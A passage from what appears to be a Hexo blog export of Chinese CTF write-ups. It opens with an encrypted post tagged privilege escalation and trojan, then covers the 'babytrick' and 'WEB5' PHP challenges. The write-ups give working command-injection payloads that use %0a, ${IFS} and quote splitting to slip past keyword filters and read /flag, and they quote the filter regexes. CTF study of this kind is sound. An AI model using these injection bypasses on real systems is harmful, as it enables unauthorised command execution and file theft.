81dc51031d45bad99896bf7acb3395a2c2d9536a89fd432eef04ba4ac068e71ef3dab4950eb46cdc5b5a8f21cb78a60808f00fdc2271f9347aa4bfaf764e104d02abdd9611a0e62b6dbeabd19c408605092792751f7493e3d85114d192d298a7f859675ad8306e64d842f87152d4c122d03c55dc5db09cc614d213d47d96b416543c0095b9e4405aca8128d372a9d14688306e1e0516a06dab7d940218e1a0b992c5b8b96feb939ca2a0ed9d4f1461a402facefc6890277ba56a6309f4186d1215a24e2e962507ccd3b5174ef5860c609a6fe5c521b151ebe3cc0e1401bdff041578510f8ca3113130caeb29efa3dd8b004be3b2c218a0640ed4ffa604309ddd64e43de230342472e377b63ed26032ea57fcd5e078c1e82b88eb585f43c77fd36caeb8e782d93af65043df2c3148ad911b6885bfeb0e37fe243c14ba8f528b729fa1eb0d1eb79dc5c8edc0acee7e644a42d94e161cdb4373f05858d526d4f8575998957e1edb6ab7f36f89e8aaf760a69b4dfffaabcedba6ffd4a48d39e9fd123c70221264fdaf5cdf056430605a93b1a1e8354502ee8f39824bad74d28171607414aa17eab4e9c652008cf0be06fc31b22977389c9b829ebc2d6b7a39a3ff5898c61bf30566191358324a0934829b4f84403b2175f48f3e1eea829df8268301eb75c4edcf87c0b3fc7acbfa499a2415803896e779877b231c72a79d2663408ea90dd6177afe695be788f16c7d69428455a8475944936a7d22adae33e509acdf52e4f367ca4532d237810952b0039481e5bd0b68e14b2daa603211743c1e71202cd86376fad06bb5d0ef2ee4f2bb8cd605b02347f67cb8fe9ecc50bb7aac7656c3c68ba3804688044af36e537fb8eef052ce1bea436cf9f4ee5803679083eb974198bc8813c36d39bc9649c7f00b7e8455da16f32eab0b99d904c72b6b67d73119a5b4ee9fe26f514e24249bfcf7cc1dd2ff09b99e66cad085f561497e468ba6d5912729edd76729bd27a8e624f3b4517201dcb8c7be55d680b02806693f2775f272e22f57345f4f6ee6bb7ade0dd81ddb624031203bf55801653f99a6d2ed0636508ca52d930d647eb459d199425e92df25e1b599c1318f93867e869fbda919e2b7dc3451592adec87428a65ae44deea801c2da2a146e751e10018ac8c369652808630d510bccf617c3163c1c200ade52d498b825ae8e43a8bcb607d11dcffabaa9663a9227c72bd66e779cb607b24ed4c06d42a6a7a945861d5e9d8a47f63b3398d3565deea69ea31453a7bc2e7969cda90323d7d0e1121ba217ce60b776392f641bc40b87a8aed3026aa06ed854c4fe299e0bc165ab0475ab8afe581b1bc44f8f269a60cb0c6570566a02530bdf21772c2d384add88a5c9e7d0c00026a1d9752c9832e712c163000ae429cb26602e5e883e340d06189aadb0ec02972e34f0c0d7bd2a4354a7871013bd92748f2596ea3ea80384d1c7a8ea226476a4928e6a54208117d8a0a5980df8ff9ed338adf2b082825a8bf0220a4105b489fda44469a12c50bc674fbb7ac3957040cb951336d9290fc6111beb90cf4f729e3866c0c6711b5baaff3d75e9d8160183605a1aa55708787a6ff130d90269d76a91f1fbdc852eb2a425fa2e555c7fc267cce0212d5aecec7601ccd6bc1ebee09da760f5c63541a0ed5f50f69828bc3384924a3ed6e36d5f6c62f47dba05f95333436e0f1660e2079fcf27900ef76c3b188761a2a18cc752bf9708f707fa936bdd3a518c36406cc339a00d7ba9dafbbdd8b0f380e2a01ea38a9e0f3b4f0b456b2e424dfbedb7823245a2ec0eac0c94df58293f8cdd795ebca2caae75267bfeb49120ff782e62b2cf92f4e6a8a02baacc353541e148160866e8bcc239869ce2278900ad535f19deed16e4530660e97e710ee9df4bb6c5623d4ba58ea936b3b9e36f48e3df01ec3a050397c0406689f9b0a4e989667d5615105e2456ef55ca9c8bb13b9dfe39614ab410bee583c7cd56931b3a8625b0127198d22304aea035962ed26579a0a726c90de4df3f6aadcea10e402c631e99b9f2b98065924233018e2d8f9b58b3eef6d56936dff10f2f52d02f4f3d243d80eb40b260e4fd3f0c73e887dc6db283ac6b57fd81b0f7ca332a4d1bc171f02de841c57bdd28b21c26f1e841e410f821bdeddc001d7bd4abccfc4a39a5dad2eb8302f02bf6b767fcb978a28d36abca8ef89d23d5eaf05af0658397ece9110193d510ed7f3d45a38bdc9dbe53a334721da4a36a79101ff728012b97990129f1d73cc8ba50b0a28f2fe192f72bc099193dd79a13fffd64b3d2cf951dd39739224ffd11a08de6244c9b339545005bee96b8ef240b8d31b4e3f012b75c5487befbc23edbf8015455cf7cbf4e349fea2d7de353d8e084e110796666e312e048f7634e7ecf335fa13a6d07535d51370e238ce10f3149fbb2d8453e9518b14fac6c97442b0c80562c1c25e3b8880632fe60bd2aca7831e5d90f245c97a945970f804e6f8a7a743bcd7518b974b8752af58b32e6284c39d1eb5fe8b686ecd956e1b5c3a904ee0553cd7dc36dccb504da67622a4eea14a67b72c486966ec2c4d67d6b63dba7ad4346d77a12df4d04495bd615a2a874342cb0b017256e7b238fd5482a9ac0a8fd7dcf417a6122cecacc4d4c3cfbd2906df549c4a5631a6af83d9df817800f894862d32ac62f2cf8c1b4061be93cd0952f7a52447473fe2495f34fab9aefc1041a7ce23a1cef2a083a203830ff71d23d8360954b0c5a376407b6e5f01376a2f59bf1e79443de2fa8a2ba0078566ecf520325d22ce06d7d64dc4378c1b472ce1f039e099fcbfab409dc8879fdd0a597cd625c1fc333a17049bb4ef287508bfd7c2c4682d4dd582248ea027ecb6a79757d1b4befaebc8e28e41b964978346056b83e9a26a7306bad188f2551ed408b354c7d6569c795692747c1de172082297c7c65ee6ff0ba39a25f59f8d799141ba5c6caa9c608c3ca572eca75d74e9d830bd1a3413b4b8c9db94af3dddf8f385b08b22eb63fa4591e2bf09cc682c625b2c7be1b3ef79d415eaeb1586089f306617238616d08602aa7500054da91ff9c3cf4c4e82c0f09ca8efcd99bef1714782c6b683fb1cdcec86ab1002c964bd1bc2764d79d1ec5008a7e36001041d6c029be9e509a6bfb98d220645db8da9840bdb8e8ed4de2df460fe95f6baad1ed3c3e346aa3ec4c20780dbcfe31538672ca26d77d2b1ee1e39909dab1bae13876e601bc741ec0d199f82e77a98672f12c6d685205ba52cedb4eacfbf22d3ed68c0883f50fdb855c6e0c0acfb7730a84daae020cc8cdb0b38ce24b211372a908d9eabea22a1cf637bff5d283219e05946c9ef24b8411e8ca31bd98c206ab4f7b2d88e11f52096d7a8a7fdf6811077dc3bf7cdd942b34d9f487bf812b270d355c9672ee4c92c97eecea77b027e8ec2cb1a4818afadb35963f704922092b46701522a651fc545a09254bcf224732301762a915e4f59e51f33cb734ad0a8f3152d2c4d298967eed55bd7044fde36ced3dbf099cbd79c7620aea6377980b768ca2ed6b8a9d405f1f9309a990ed34b9ac3f726b653dec6e66142d9a7a91c496561829f3b67a6dd3edece5daa932fa479c74217682cb40a688653b4b2b7157f573f7c9462936ebf57b867231db9f350309aa6f54bbb29d60d2324fba9ba83bbc979625763d8e33c9e060a0017a890ba1c25a72810635a7336412a4e730b1099eeb8961da743a7cc48f09a65d0d0ac1e6175b2bbc5a336fbb445f45123ce5d2a1c704c9b4487f14a22353c2e555751687d8ab96449484d20b68cd8e22c106369a1c896f7b27f8ec216ee1ce77a599faed166d6190c036a89aa3ed06094afa0054a5cec3c108ae997271f207e0438f195689332efa044fc7cd0da2267822764b02ca8febfd61559aea812e50603a8c00a4191ee71f5f6756b5d002babcc858ccad2527973c65c5bd994c67e1275d0b39af3a228ee0b347c7a50edc037b7d4dad6667a591408a8dae746d9a579d858eb6855a7a595c3b6337432dcb120fcfb39bba2961a0a7c0a22c224ba20fea66bee4bad9635f88ac100fc668116cd0b7d12dac71718d7d977ba9fc8bf4013638d4072d865c65c9db2bb836c1b42ed47778b704844d75afd19b7a955fc4c2d40c2d4d25d401332cde3a176312d722e2be8ed1e18c5de767a3d4d597a6ff0a035beec1ecd2966e36cd2efedd76cd5e4c4891a2aee120bfd5b4ddf0b7b3a856c825c79fb2fd7b009046b5402b5e5ccd2c9c6cb0f8cef8dc76b13f6bcf852cef8c7608012ba37e3d763f1ff9b283cb54ec678827e9f55a54ee13623cdea41957cd57e48e746cc0eb1a6c70be4795af6e58fc050ae5737bba56e665dfa5604cf26eec014456300a995a434b23b2e933e71ddb083f14d5b42e3d976e036ca2c7af63ba2118439d354fb9a9c59af7a73c907b1bf721eed72ad878534cbebd5e3fa4a875ab4dbc8d8fdbd79a59bbf0ef4e8c5bfe336de4153dbafc0165b753aaa652d8e2e29594f14b44e91c00b0e3237fdae62a53bc2dade0c76cbf045f541e75b90bfa254bc73b34e3275393ca479b9dc68d274a853697612981272fd7e834447156af3d28a327c63f867b2c3fbdad1a7f025c990d2329ec3fa3349621757b2cf3f7b88413d9854371b24504f36ce2e39ff8a1fd97346734dca8a0f81227f8a8f0b4e290e65c82edf8063821a107eea1241f719d1ebea44bd18810ceea08a4cafdc18e2f036e7f505ad9d5008622d80cf22ecc000bf2352042db36067ca91ccc1a71df6f7c9342b5b41f84c0e62ae5dfd5432ff612aea586d1307310b210eb02b109851eb1793f9e0da7f836008740a46b80eddd2efd40fbcdebca2e03adf44e82eb9bb28a26ca357692a3d9cc829a1a88167c88a0c2aab7b21246b3e1c74112275c2bb64ec7a5e6fa38fa9ad0383562646201bd7c79290ef964dd77f8211259aaab96cb96cb52189412f3a712d8e7b3b08b8ce8e9ffa2af9e99c273773f2d99e3a94a135b6d4ac937328560e3a1f04d8558e167607a3b9080e8b70b56927ced6f8a5e304b6a82ce8e34e1e8d8dfdb8da3e08218ebf27561f34a9b18f36f8c82b9aa26ea41a9cd241613a71195a886fa687c0e9807ddd95487812a2650dd85b781e2dd28d914a6c1adac05b3b8feac52a0b132afbf4cc0fe0648d851b30068e713251bd1dc338903ed864300f88512fe3774151497b7b5d55bde8e2e9fe2beef016aeb536d2509420fb751f85d2db01bc1fa018a3cd99707402a5a82f20ccd727e40a80bc1827b6360a24b7cf9f96a5c8e7b53a357a525b08106c4b77cd304e66b01aec6c841260a19a1cdf7d454154dac6aec90a10beee4ff1e85361e104885ebab9565b1383c09b875bd46748200d7f0acbf835fdb6f1dd9d07e45088882635686bbc3eab9502dd3e864e0c4727e429eb50c5d1f337987c56904243e36baf685a5bd0654b2c7f558545b53ad17852d95383727201a3e1d7e76f49e1e98ef8df46d931d4878a0ceb2fb11d5af430f5bf3ddb2b18f2bc24b16fc82336f7001d6020344787c3e88224a8e28ba0340a54f92d9e91b2a3f171d6434504cb21810c7f59b9c2fd6a9b3061fa3d48ae0745422be20b1887f4296263b052c243c087082b9dc244f8f43267241c72416f2bc8a7f2ccbd87d38c62f8bf631983528edbb43ab895fbebe42f944b2eff115e88e6c7de5f31c53274128c0c33899b0f722f84dfb8a66bfa4b237dca0b4dd3952a26235bdd67c5f2e018cea3fc435708e84b776885170a2e9a7cdc54a39fdc45a266484163088c1905cbbabe3930f9c950422c1d0c4dfa443b9d5e4b17f4cd17562f30caacaec5bfb83a1b6769df29c9fcd4471aeccb59b8e92d27f96b18da53d6cd671813d84b48199f3418c2d383c06b0597f76887a3dda9f1de93e07964103a30478a762b111cffd3e6ccfe099ff6e8175cb709eea6850e72cbd25dd50ee5413141ec9664cb6b80056a0701585145776d5101c4c93bf21b96318ddced94e6c8c8729019c8ae550e63647788dfb773656c9bb1c08159efce358211424bf8cf1dcd70a5e547c249d61a614c99f9795b4b8ae8643c393349e89a17c79ae36d03bb73efaad53a4ec56baf465082c407fb8c15f6b247a8b7c155dc7c56ac3384d31a112fc960efbbb66d44895025ee009c89a078b7d805e0915cfed30462a2ba0ca01ad055da16b497898be49275206f5eae9f62b61e26cd7247ef7d2a7dc8f723f139d91b4d6ed621a91a601469eaed0d8164f281d1da1e45c5ccd244aa12f08329222fc3c73537be68f8fd811a132778605bb0ec49862316b721a8b6ea7b00236ad3d78ddf0591434b178db43c8fded98ef30f99b948568b62d6b0268a3d72d88e046cbfde92c302fab5842a1c6e4eba7dc2c144f150cc5c7903343eeec5b59748a33c39ef2bef3f19949afe4da16e74e29d721f67786f04a16140da5e91dfc3dbb7342a4a97a57ffebab6a76ef6e78fbb41cf028f59d592cfa56a751065b4ef0d76d17f181821c12ce050ab7f98da30b815afa7208e4747e1989e9c01b2d8aac970bce62f035d4824aebf98b8488cb7df36f1316d447f1f97ad08e55f441e1d1307dcd820daf2940e187fb2a1ea59e93eaf49d0e01b4e84b7cf6591859e7d4fa399c25b00573e91a4ca4f72f590557fe935f7cd8a481b0a49483601ff575a62d8e51a35d22d3bc966b36c40ee2bc92a8a024c19febae94670be570f2eef6ad2d2973141cc1cc20a983561abee540bbb10a021ee9c6fad17ce42453ddc8dfad14217502b800fc5c5d1e67e901d4301053806cbaa830df33a544a02ea756db45f0683a9da449234e52e7015909339d134c83208521e390a4ee7cfd7047d062084fbf632e56e6eb0bc6df9a6019e0d3cd933f9acae36c73ff3e845125ccc9fdf517c021014e4b44044ba5f6184a562c482fa216827d2aeea71c155e5f8c9ec836adcb55a37592368a9e8ae5f517eb7b67bade67009583886648ec06d1b44937cd8a0905c9f0fc2f476d93f79e9e85a42ed5a4cdd99dff5696f6adf1859e34d21477b2ec6c0889594a5e3231c3d756b3d9665a1a0547bca213d7ff1c0d6bbc48e3c6de7a6dfa75d88c7d559b596bc5b6d3573b1d91a75d88f08b59e50cad5919bee58630902f929c2dca246aa719de831966549cbc37a5051511cb1c3ae5171fbb26b5a1be1fbedc5b4cfa11d6077500cf25de843b665c9299d19e3e4a36ff0d34c47d5badd6f464d1aade97969603fe273a095919ff5c570c6a43c9db7c1ebb8f91c4f65dc3ec3d86f5e396ce256a6c15354c349e12ee38a693bf66e103072472a0eb9bd39ed6cbd7c467e86c3a9901d1e6a5d4c120026b1af9bc46472ba22f007633d9e5d53f8f1c61625becf0b27e74ecc7cde2fc1ff9f429e02bcae280131179d116d82f45fad240c805b1b78338ef2c7c9e16ea3d38a627ccda0bf15f11243dacac0ea6a1c2ff0673f5a3a8045629bd7f3e0ccb40a4ca0e51eae093ae2fe4118d4f5bcd8bc2c2f39c1f9af43788a44014067dbb3a14590f00da3e33420592cf6e84cb78246cbda5e7284ad96de40a43624289367cd132043b49fd693fa22248df101cc63215051ad273ebfdc0408bb532e8e10591e33dfe651d1806f3180b3375eb25d0d58b574328722f0a92eca12f6e0f16a0ff9282a330d689fd1fed4946ee53207490f0dfeffed193d1ceec11318ae9ab36271f038740b7250907db0f93a8592cb371b4cc576230f4186db98dd51402fb002515aefdb887bd0f517457efe9775d6c959c3ff224a458a59c878fe1c937c0fa7525b63f364e2bf1253cf1e6ac8780e4f3bed396b70fe43cedca155c2098e036c721a4d20d7f1525bd138b346feabb171eb83198f620a7942be9dec1973749d281ad0a50178b172e67187b3e5bcaa09b94d5fbe33128f8cca4e581a03246d892968c581534a71bfa52efee8b38e5d10a6ce7bacb17706ca56a2d7cf2452e578b3fa48bbaf65db4fe0e72206ea3d7c82f8b17e88d76dc166a28b24159f913476ca3a29bdec063fdea5d163a1e3e0d76209d0c83376b86a754fd5d58fd88fd1b5cee5fd5c8b9968758ace78a8a5030458581ca060c581a7cf6172c01922d022eb379ac3f754c041f3f0034f0ef6ee43d3f274dc06bf432730c325ea593b851713bc843d6d59fc050d585a08e439c1a2636ed21448a2ca10f3ac20d5fde38c1d85bcd4211106fa96bcba4daf5ab5da10b47c42da59c6494be1806e2ccc63b2ac6b7858b4fc46ea208cfd9c7ca95c1f923cd67f344bebb77c3b441a74880d7ca48106b46990bb95b744d24a4b522b90f53869c23e14911828716e91db79241bc0fafa6b56b09082134d585577e951862dd142db0562e8e692049a17207cf9c42cfa0a0bf7854419ff76b81bcd8789b87fac3adc72874b18b648cdeebcf89fe13a72086d620f1d5f06520668fd1bd57aa30892989182be33bee0bbfc7d0af77a55ce86325ced77a7d1209029ff6115469e4d2e66d04f81738f0aa91ce4189e3e944fa769a03db6442951e157e2fdcee466678f16edffe68c76785aa076df2d64329df6e4cf3fb4aa6a673b37bfee2e4f9e2c80557d4f3dc18d69d8a18b2b82cf8e899a835fdd26159af2c935de193acb6f31b02fe2eb9c63330f77c37c0f133beb3a12d179c91c2c3ebeb7a06c3e1872635f451a653358e0240d7090372e0075d7f254e414dc3e69d367102b1c5f350c5f721edc3030a83740d4b7b4c95f960fc14eb961feb97bd9d3a65e57f7e4dbcf4743205d146cb0a94b362d33ff5f085862628ba392a4b637dd3a0e2661e0288b595930ece6edfa42dfe6af908ee979f07a49839350f883a0916389bcd6244a510d77886ce17859cba1750e2dd064e86513698cf00207df42c90eb79cafeef8b0d34deda436cda87e965fb018f3e51dbb0665b1cc38da2bdba79b95cc46f9978f9f80ca02588c2a2e379bfe043dac4dfcd803ed21dce051a72ef2f7a586b4a82b4082b603d3d886bb7ce6c6b66e32f143303f9bba0b5861142d3c3ca032b3f63a15fdb5ea8bce9c057f923cc3e63d558271641b0ff6fadb363ec670120fba3326d3f89ce05a2eeb1ded30db08ad2a2b24c7cd65a5e07f8a2f7c158f87032cb53610ed52317987637c81e0015218299317aa8ab3430ec1476057854cc58bf2da435aae063e821bfa28570b6b79d81cfa8f4f043e5f6e2955474e08a77a7ae36fc193f3ebcccd95c8cdb60fc1fc257bab0f2ad252ec1bd4d9103f8cd0c113689cb9b5378fb282b00eacf205c76ac12012f239bd8fd5d2ea6e1f67d49ee45cfd3a15624bcc5bc67d75ebc50323133d2a7b870ab87179b19c9aab78c69ce048b76c412795e8368db2d843a3335e1590e8edd9fe7bb625ed32a716f69f877a584685986f3bbd49d845f0795679dcb82d8d3a2511f6ef0b67a7fb4c16d6d8b555d93fd989f4946be17edf778501a158d97b32605201e593232c4425be821e39e9a1ed04feced784afc61d19d16630d834254ed72db91d36dec61954a0cf5af03ebb9359ac2b9ee128ccf303404c570f5b07f87a76541d30aa5d9e807d732845d926d91e38c1c38b30e68a47e9cec0755f0dfb7df6053d2e4b9c252844db3192ccfe5cf926150f6c099edca118ff61df679f5f01940df151e0c39a97584a16e9e887a57dd5ad7c9d75226bd77bad5026a86cf98c5c3e74f5819430b90b7c834edcd06545c38b97ac560eafe9e1b6136df2d57c464eddcfbca20bcaf5e15b6f21120def0a992a60f81da5c756d68824d43111734b3b805fc931016933846d55e1dab870771fe851c504b5c687ded68e3a45cb59a2fc500df9abad35a20634260f1bae9aef6438c424f4e314ba56736a369a89f74be96b3f72212369b9ece5a1237c106da9f432c123b195c98f40b7ea442d98d8488dfa66d7b48fd8610180eb140b60d6a2fca403c65c772257f8caa0008b3fdb36ee99d34ed446f7153b5ff82cbeafa9cd5d1e0f5a836e0fc534aed970169597c1995c9d2d1be5033fe1a071fe763abfdeb705f35a62158dc4bfa3c68c49c7bc1c3dfbc6162ac40b953d987d0f693639f6dce717603e84fbb6aa5c86441a92cdc8de8e9c36eb67c5951272ef971755e94a5cf6522ca78ec0872a4452aaaa62476c5ff00cd40aab218716c371d575fb0344f0c9ac6d700b5dbfde569837b4698acc228a95c49792cf226386ed86d1dc235f54437a4dc982e380832e8252c2fc42e576edefc81134dab715bc4b9b266519b9e44621ff67746a784dd96b276b1757566f5c30dd89ee8a731c0bc4d44a1d0b206dc6246f7fee8284fe27f5f2c3e19d590712bb007bf6a466e94e7d7b72f93da771030cae204bf58d303a572b9ef39be848f00996e0a8a9980c6f1140b632af15b11fabf58450b0e8ed333321e720a70176282638e7e7fea4c05dd704706c01523efefb7ce176c6d812ad1f9f5af6bd1437e6d5a55ee2060e4a81c51f24bd084acb58a3b2c92c0634303c39d8009f3c465afc888fd41684644d0cd31e51a74177d1a19aeabe09d097ddede946b9386a5f0d721c6dda107b5a9f9a11f52af02996ae36fcc3dcdaaa2e982649a4a0057dd0e6a7a11642295550b0f71ab3801b791d727fc4742cf8463a168e3b1b67bfd589ea1880e4b13bd1ed756ab6b3802776a01ecc8f9c41d8fa04cec1dca96b09eb58411c789703de997670ec8871bfef6866395568e9dab56166676680c959f8b2450a94f12da4a618583e113bd99783ed38272f4086562a42589dd0e6e75603a4d2673549d2b8f690a6a18911bdb3cb46f5cd6f7ec0baace3e54766a54fc69f431dbbcd7d3cae72c081f05f43cc0b76f42b6c9b8a487a8150c58cd2cd9636b2013b3ce216d63a339c4eeda1e31af8fe45bd0d9c230fdf5bdb54fe92d932da841bbd5d6efabeb1f5cdcca72c59d5a4cb72eb6641c42119b5e0a2c0b05cc6bfb3fc09510741b8ececb6df9e7b051953f3b3fc08d0f48d2f93f2c874958cb6c246e8c9690ba6efb5f235f204f02b343f1f2b5252e76fa999c06233d7b3d5ce81d1af461ed698ec9ce1af0b9b405242e783f196b04edadb8136590d2d7e46d2e35812eb528c18b6b5f21c5cc66d84733b7652d6d9ab6442b8d2b6559e2</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>提权</tag>
        <tag>木马</tag>
        <tag>命令</tag>
      </tags>
  </entry>
  <entry>
    <title>竞赛课-babytrick</title>
    <url>/2022/04/16/%E7%AB%9E%E8%B5%9B%E8%AF%BE-babytrick/</url>
    <content><![CDATA[<p>看看源码是什么先</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">your</span> <span class="title">baby</span> <span class="title">trick</span> <span class="title">bypass</span> <span class="title">me</span> &lt;?<span class="title">php</span></span><br><span class="line">    <span class="title">echo</span> &quot;<span class="title">use</span> <span class="title">your</span> <span class="title">baby</span> <span class="title">trick</span> <span class="title">bypass</span> <span class="title">me</span>&quot;;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_error&quot;</span>, <span class="literal">false</span>); </span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line">    <span class="variable">$str</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;O_O&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;O_O&#x27;</span>]:<span class="string">&#x27;O_O&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&quot;O_O&quot;</span>) !==<span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;O_O, baby&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="variable">$str</span>&lt;<span class="number">9999999999</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;too small&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ((<span class="keyword">string</span>)<span class="variable">$str</span>&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;too big&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$num</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])?<span class="variable">$_GET</span> [<span class="string">&#x27;num&#x27;</span>]:<span class="string">&#x27;num&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no num&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$num</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span> :</span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span> :</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;secret.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span> :</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;2333333&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> too small</span><br></pre></td></tr></table></figure>

<p>好！先是一个_的问题，这里直接用空格或者是%0a就能替换掉，这样第一个就过了。<br>其次就是一个数字大小判断的问题，这里用数组进行绕过</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?O O[]=9999999999</span><br></pre></td></tr></table></figure>

<p>num的要求是2，但不能是数字</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">num=2a</span><br></pre></td></tr></table></figure>

<p>f12查看源码，发现多了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?php</span><br><span class="line">    <span class="string">&quot;my secret is in f35cdaa4e8672a43e73aee7c2dd51731, try to get it&quot;</span>;</span><br><span class="line">?</span><br></pre></td></tr></table></figure>

<p>访问f35cdaa4e8672a43e73aee7c2dd51731.php</p>
<p><img src="/2022/04/16/%E7%AB%9E%E8%B5%9B%E8%AF%BE-babytrick/1.png" alt="img"></p>
<p>绕过问题<br>看看有什么</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=<span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/16/%E7%AB%9E%E8%B5%9B%E8%AF%BE-babytrick/2.png" alt="img"></p>
<p>抓个当前的php看看先，这里过滤了cat，php，我们用tac</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=<span class="built_in">tac</span><span class="variable">$&#123;IFS&#125;</span>f35cdaa4e8672a43e73aee7c2dd51731.p<span class="string">&quot;&quot;</span>hp</span><br></pre></td></tr></table></figure>

<p>这样就ok啦，整理下返回的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^.*php.*$|^.*echo.*$|^.*cat.*$|^.*busybox.*$|[A-Z0-9a-z].*&gt;[A-Za-z0-9]|[A-Z0-9a-z].*&gt;&gt;[A-Za-z0-9]|[A-Z0-9a-z].*&gt;&amp;[A-Za-z0-9]|^.*rm.*$/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123; <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大概就是这个样子了<br>构造我们的payload</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=%0als /</span><br><span class="line">?cmd=%0atac /flag</span><br></pre></td></tr></table></figure>

<p>这样就能拿到flag了</p>
<p><img src="/2022/04/16/%E7%AB%9E%E8%B5%9B%E8%AF%BE-babytrick/3.png" alt="img"></p>
]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>绕过</tag>
        <tag>命令执行</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>竞赛课-WEB5</title>
    <url>/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/</url>
    <content><![CDATA[<p>有一说一，这道题的难度本来没这么高的，直到把flag放到了根目录下。自己挖的坑自己要埋上</p>
<p>先看题目说了什么</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$res</span> = FALSE;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|php)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 &#123;<span class="variable">$ip</span>&#125;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span> = <span class="built_in">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">        print_r(<span class="variable">$a</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>emmm, 总之就是过滤了’|’, ‘&amp;’, ‘; ‘, ‘空格’，’&#x2F;‘, ‘cat’, ‘flag’, ‘php’<br>先是过滤了分号的问题，我们可以用%0a绕过这个（%0a换行）</p>
